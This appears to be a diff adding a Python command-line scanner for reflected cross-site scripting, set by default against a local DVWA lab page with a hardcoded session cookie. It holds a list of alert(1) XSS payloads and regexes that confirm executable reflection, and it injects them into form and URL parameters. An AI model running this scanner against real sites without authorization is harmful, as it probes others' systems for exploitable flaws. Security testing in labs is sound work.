@@ -1,0 +1,266 @@
+# -*- coding: utf-8 -*-
+import argparse
+import html
+import re
+from html.parser import HTMLParser
+from typing import Optional
+from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
+
+import requests
+
+
+DEFAULT_TARGET = "http://127.0.0.1/vulnerabilities/xss_r/"
+DEFAULT_COOKIE = "PHPSESSID=6aec3jv6oc4stp9jjh85ah4tg5; security=medium"
+DEFAULT_TIMEOUT = 15
+
+DEFAULT_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+]
+
+EXECUTABLE_PATTERNS = [
+    re.compile(r"<\s*script[^>]*>\s*alert\s*\(\s*1\s*\)\s*<\s*/\s*script\s*>", re.I),
+    re.compile(r"<\s*img[^>]+onerror\s*=\s*['\"]?\s*alert\s*\(\s*1\s*\)", re.I),
+    re.compile(r"<\s*svg[^>]+onload\s*=\s*['\"]?\s*alert\s*\(\s*1\s*\)", re.I),
+    re.compile(r"<\s*body[^>]+onload\s*=\s*['\"]?\s*alert\s*\(\s*1\s*\)", re.I),
+    re.compile(r"<\s*details[^>]+ontoggle\s*=\s*['\"]?\s*alert\s*\(\s*1\s*\)", re.I),
+]
+
+
+class FormParser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.forms = []
+        self._current_form = None
+
+    def handle_starttag(self, tag, attrs):
+        attrs = dict(attrs)
+        if tag.lower() == "form":
+            self._current_form = {
+                "method": attrs.get("method", "get").lower(),
+                "action": attrs.get("action", ""),
+                "inputs": [],
+            }
+            return
+
+        if tag.lower() != "input" or self._current_form is None:
+            return
+
+        name = attrs.get("name")
+        if not name:
+            return
+
+        input_type = attrs.get("type", "text").lower()
+        value = attrs.get("value", "")
+        self._current_form["inputs"].append(
+            {"name": name, "type": input_type, "value": value}
+        )
+
+    def handle_endtag(self, tag):
+        if tag.lower() == "form" and self._current_form is not None:
+            self.forms.append(self._current_form)
+            self._current_form = None
+
+
+def parse_cookie_header(cookie_header: str) -> dict:
+    cookies = {}
+    for pair in cookie_header.split(";"):
+        if "=" in pair:
+            name, value = pair.strip().split("=", 1)
+            cookies[name] = value
+    return cookies
+
+
+def build_url(base_url: str, params: dict) -> str:
+    parsed = urlparse(base_url)
+    query = urlencode(params, doseq=True)
+    return urlunparse(parsed._replace(query=query))
+
+
+def send_get(session: requests.Session, url: str, timeout: int):
+    try:
+        return session.get(url, timeout=timeout, allow_redirects=True)
+    except requests.RequestException as exc:
+        print(f"[!] 请求失败: {exc}")
+        return None
+
+
+def parse_get_forms(page_url: str, body: str):
+    parser = FormParser()
+    parser.feed(body)
+
+    targets = []
+    for form in parser.forms:
+        if form["method"] != "get":
+            continue
+
+        action = urljoin(page_url, form["action"] or page_url)
+        params = {}
+        injectable_names = []
+
+        for field in form["inputs"]:
+            name = field["name"]
+            field_type = field["type"]
+            params[name] = field["value"]
+
+            if field_type in {"text", "search", "url", "email", "hidden"}:
+                injectable_names.append(name)
+
+        if injectable_names:
+            targets.append({"url": action, "params": params, "inject": injectable_names})
+
+    return targets
+
+
+def query_param_targets(url: str):
+    parsed = urlparse(url)
+    current_params = parse_qs(parsed.query, keep_blank_values=True)
+    params = {key: values for key, values in current_params.items()}
+
+    if params:
+        return [{"url": url, "params": params, "inject": list(params.keys())}]
+
+    return [{"url": url, "params": {"name": "", "Submit": "Submit"}, "inject": ["name"]}]
+
+
+def can_execute_alert(response_text: str) -> bool:
+    decoded = html.unescape(response_text)
+    return any(pattern.search(decoded) for pattern in EXECUTABLE_PATTERNS)
+
+
+def classify_response(response_text: str, payload: str):
+    escaped_payload = html.escape(payload, quote=True)
+
+    if can_execute_alert(response_text):
+        return "vulnerable", "响应中出现可执行的 alert(1) 触发点"
+
+    if payload in response_text:
+        return "reflected_not_confirmed", "payload 被原样反射，但未匹配到可执行上下文"
+
+    if escaped_payload in response_text:
+        return "reflected_escaped", "payload 被反射，但已被 HTML 转义"
+
+    if payload in html.unescape(response_text):
+        return "reflected_maybe_escaped", "payload 解码后可见，建议人工确认页面上下文"
+
+    return "not_reflected", "未发现该 payload 的反射"
+
+
+def build_payloads(single_payload: Optional[str]):
+    if single_payload:
+        return [single_payload]
+    return DEFAULT_PAYLOADS
+
+
+def test_candidate(session, target, payloads, timeout):
+    findings = []
+    for param_name in target["inject"]:
+        print(f"[*] 测试参数: {param_name}")
+        for payload in payloads:
+            test_params = dict(target["params"])
+            test_params[param_name] = payload
+            test_url = build_url(target["url"], test_params)
+
+            response = send_get(session, test_url, timeout)
+            if response is None:
+                findings.append(
+                    {
+                        "param": param_name,
+                        "payload": payload,
+                        "status": "request_failed",
+                        "reason": "请求失败",
+                        "url": test_url,
+                    }
+                )
+                continue
+
+            status, reason = classify_response(response.text, payload)
+            findings.append(
+                {
+                    "param": param_name,
+                    "payload": payload,
+                    "status": status,
+                    "reason": reason,
+                    "url": test_url,
+                }
+            )
+
+    return findings
+
+
+def print_results(findings):
+    vulnerable_findings = [item for item in findings if item["status"] == "vulnerable"]
+
+    print("\n=== 能够显示 alert(1) 弹窗的输入 ===")
+    if vulnerable_findings:
+        for item in vulnerable_findings:
+            print(f"[+] 输入位置: {item['param']}")
+            print(f"    可输入: {item['payload']}")
+            print("    效果: 能够显示 alert(1) 弹窗")
+            print(f"    URL: {item['url']}")
+    else:
+        print("[-] 没有找到能够显示 alert(1) 弹窗的输入。")
+
+    print("\n=== 其他测试结果 ===")
+    for item in findings:
+        if item["status"] == "vulnerable":
+            continue
+        print(f"[-] 参数 {item['param']}: {item['status']} - {item['reason']}")
+        print(f"    测试输入: {item['payload']}")
+
+    if vulnerable_findings:
+        print("\n[+] 结论: 上面列出的输入能够显示 alert(1) 弹窗。")
+    else:
+        print("\n[-] 结论: 当前内置 payload 未确认能够显示 alert(1) 弹窗。")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="反射型 XSS 检测工具：输出哪些输入能够显示 alert(1) 弹窗。"
+    )
+    parser.add_argument("--url", default=DEFAULT_TARGET, help=f"目标 URL，默认 {DEFAULT_TARGET}")
+    parser.add_argument("--cookie", default=DEFAULT_COOKIE, help="Cookie 请求头")
+    parser.add_argument(
+        "--payload",
+        default=None,
+        help="只测试一个指定 payload；不指定时使用内置 alert(1) payload 列表",
+    )
+    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="请求超时时间")
+    args = parser.parse_args()
+
+    payloads = build_payloads(args.payload)
+    session = requests.Session()
+    session.cookies.update(parse_cookie_header(args.cookie))
+    session.headers.update(
+        {
+            "User-Agent": "xss-reflection-checker/1.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        }
+    )
+
+    print(f"[*] 目标: {args.url}")
+    print(f"[*] 本次测试 payload 数量: {len(payloads)}")
+    print("[*] 获取基准页面并解析 GET 表单...")
+    baseline = send_get(session, args.url, args.timeout)
+    if baseline is None:
+        return
+
+    targets = parse_get_forms(baseline.url, baseline.text)
+    if not targets:
+        print("[*] 未解析到 GET 表单，改用 URL 参数或 DVWA name 参数兜底。")
+        targets = query_param_targets(args.url)
+
+    all_findings = []
+    for index, target in enumerate(targets, start=1):
+        print(f"[*] 检测入口 {index}: {target['url']}")
+        all_findings.extend(test_candidate(session, target, payloads, args.timeout))
+
+    print_results(all_findings)
+
+
+if __name__ == "__main__":
+    main()
